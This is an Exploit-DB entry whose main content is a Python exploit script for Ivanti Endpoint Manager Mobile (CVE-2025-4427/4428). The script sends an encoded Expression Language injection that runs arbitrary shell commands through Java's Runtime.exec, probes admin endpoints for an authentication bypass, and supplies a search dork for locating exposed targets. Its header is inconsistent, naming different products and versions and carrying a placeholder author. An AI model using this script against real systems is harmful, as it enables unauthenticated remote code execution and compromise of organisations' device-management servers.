---
title: [remote] Ivanti Endpoint Manager Mobile 12.5.0.0 - Authentication Bypass
url: https://www.exploit-db.com/exploits/52421
source: Exploit-DB.com RSS Feed
date: 2025-08-27
fetch_date: 2025-10-07T00:48:01.165440
---

# [remote] Ivanti Endpoint Manager Mobile 12.5.0.0 - Authentication Bypass

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# Ivanti Endpoint Manager Mobile 12.5.0.0 - Authentication Bypass

#### EDB-ID:

###### 52421

#### CVE:

###### [2025-4427](https://nvd.nist.gov/vuln/detail/CVE-2025-4427)

---

**EDB Verified:**

#### Author:

###### [İbrahimsql](/?author=12279)

#### Type:

###### [remote](/?type=remote)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-26

---

**Vulnerable App:**

```
#!/usr/bin/env python3

# Exploit Title: Ivanti Endpoint Manager Mobile 12.5.0.0 - Authentication Bypass
# Google Dork: inurl:/mifs "Ivanti" OR "EPM" OR "Endpoint Manager"
# Date: 2025-01-21
# Exploit Author: [Your Name] (https://github.com/[your-username])
# Vendor Homepage: https://www.ivanti.com/
# Software Link: https://www.ivanti.com/products/endpoint-manager
# Version: < 2025.1
# Tested on: Ubuntu 22.04 LTS, Python 3.10
# CVE: CVE-2025-4427, CVE-2025-4428

# Description:
# Ivanti Endpoint Manager (EPM) before version 2025.1 contains critical vulnerabilities:
# 1. CVE-2025-4427: Expression Language Injection in featureusage API endpoint allowing RCE
# 2. CVE-2025-4428: Authentication bypass on administrative endpoints
# The vulnerabilities can be chained to achieve unauthenticated remote code execution.

# Requirements:
# - Python 3.x
# - requests >= 2.25.1
# - urllib3

# Usage:
# python3 CVE-2025-4427.py -t https://target-ivanti-epm.com
# python3 CVE-2025-4427.py -t https://target-ivanti-epm.com --exploit -c "whoami"

import requests
import urllib3
import argparse
from urllib.parse import urljoin

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class IvantiExploit:
    def __init__(self, target):
        self.target = target.rstrip('/') + '/'
        self.session = requests.Session()
        self.session.verify = False

    def detect_cve_2025_4427(self):
        """Quick detection for CVE-2025-4427"""
        # Simple math payload for detection
        payload = '%24%7b%32%2b%32%7d'  # ${2+2}
        url = f"{self.target}mifs/rs/api/v2/featureusage?format={payload}"

        try:
            resp = self.session.get(url, timeout=10)
            if resp.status_code == 400 and ('4' in resp.text or 'Process[pid' in resp.text):
                return True, "CVE-2025-4427 VULNERABLE - Expression Language Injection"
        except:
            pass
        return False, "CVE-2025-4427 NOT VULNERABLE"

    def exploit_rce(self, command='id'):
        """Execute command via CVE-2025-4427"""
        # URL encode the command
        cmd_hex = command.encode().hex()
        cmd_encoded = ''.join(f'%{cmd_hex[i:i+2]}' for i in range(0, len(cmd_hex), 2))

        # RCE payload
        payload = f'%24%7b%22%22%2e%67%65%74%43%6c%61%73%73%28%29%2e%66%6f%72%4e%61%6d%65%28%27%6a%61%76%61%2e%6c%61%6e%67%2e%52%75%6e%74%69%6d%65%27%29%2e%67%65%74%4d%65%74%68%6f%64%28%27%67%65%74%52%75%6e%74%69%6d%65%27%29%2e%69%6e%76%6f%6b%65%28%6e%75%6c%6c%29%2e%65%78%65%63%28%27{cmd_encoded}%27%29%7d'

        url = f"{self.target}mifs/rs/api/v2/featureusage?format={payload}"

        try:
            resp = self.session.get(url, timeout=15)
            if resp.status_code == 400 and 'Process[pid' in resp.text:
                return True, f"RCE SUCCESS: {resp.text[:200]}"
        except:
            pass
        return False, "RCE FAILED"

    def detect_cve_2025_4428(self):
        """Quick detection for CVE-2025-4428"""
        admin_endpoints = ['/mifs/rs/api/v2/admin', '/admin', '/api/admin']

        for endpoint in admin_endpoints:
            try:
                url = urljoin(self.target, endpoint)
                resp = self.session.get(url, timeout=10)
                if resp.status_code == 200:
                    return True, f"CVE-2025-4428 VULNERABLE - Auth bypass on {endpoint}"
            except:
                continue
        return False, "CVE-2025-4428 NOT VULNERABLE"

    def run_all_tests(self):
        """Run all detection tests"""
        print(f"[+] Testing target: {self.target}")

        # Test CVE-2025-4427
        vuln_4427, msg_4427 = self.detect_cve_2025_4427()
        print(f"[{'!' if vuln_4427 else '-'}] {msg_4427}")

        # Test CVE-2025-4428
        vuln_4428, msg_4428 = self.detect_cve_2025_4428()
        print(f"[{'!' if vuln_4428 else '-'}] {msg_4428}")

        # If 4427 is vulnerable, try RCE
        if vuln_4427:
            print("[+] Attempting RCE...")
            rce_success, rce_msg = self.exploit_rce('whoami')
            print(f"[{'!' if rce_success else '-'}] {rce_msg}")

        return vuln_4427 or vuln_4428

def main():
    banner = """
--[[
 .___                      __  .__  _____________________  _____      _____
 |   |__  _______    _____/  |_|__| \_   _____/\______   \/     \    /     \
 |   \  \/ /\__  \  /    \   __\  |  |    __)_  |     ___/  \ /  \  /  \ /  \
 |   |\   /  / __ \|   |  \  | |  |  |        \ |    |  /    Y    \/    Y    \
 |___| \_/  (____  /___|  /__| |__| /_______  / |____|  \____|__  /\____|__  /
                 \/     \/                  \/                  \/         \/
--]]
    """
    print(banner)

    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', required=True, help='Target URL (e.g., https://target.com)')
    parser.add_argument('-c', '--command', default='id', help='Command to execute (default: id)')
    parser.add_argument('--exploit', action='store_true', help='Attempt exploitation')

    args = parser.parse_args()

    exploit = IvantiExploit(args.target)

    if args.exploit:
        print(f"[+] Exploiting with command: {args.command}")
        success, result = exploit.exploit_rce(args.command)
        print(f"[{'!' if success else '-'}] {result}")
    else:
        exploit.run_all_tests()

if __name__ == "__main__":
    main()
```

**Tags:**

**Advisory/Source:**
Link

| **Databases** | **Links** | **Sites** | **Solutions** |
| --- | --- | --- | --- |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/?utm_source=edb&utm_medium=web&utm_campaign=www) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/?utm_source=edb&utm_medium=web&utm_campaign=www) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/?utm_source=edb&utm_medium=web&utm_campaign=www) |

Databases

[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links

[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites

[OffSec](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com/)

Solutions

[Courses and Certifications](https://www.offsec.com/courses-and-certifications/?utm_source=edb&utm_medium=web&utm_campaign=www)
[Learn Subscriptio...